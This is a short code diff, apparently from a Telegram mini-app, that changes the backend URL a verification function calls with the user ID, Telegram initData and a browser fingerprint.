@@ -78,7 +78,7 @@ async function handleVerification() {
 
   try {
     const fingerprint = await getFingerprint();
-    const apiUrl = `https://codetest-six.vercel.app/api/onWebhook?user_id=${userId}&bot_token=${encodeURIComponent(tg.initData)}&fingerprint=${fingerprint || ''}`;
+    const apiUrl = `https://premmm.onrender.com/api/onWebhook?user_id=${userId}&bot_token=${encodeURIComponent(tg.initData)}&fingerprint=${fingerprint || ''}`;
     
     let response;
     try {
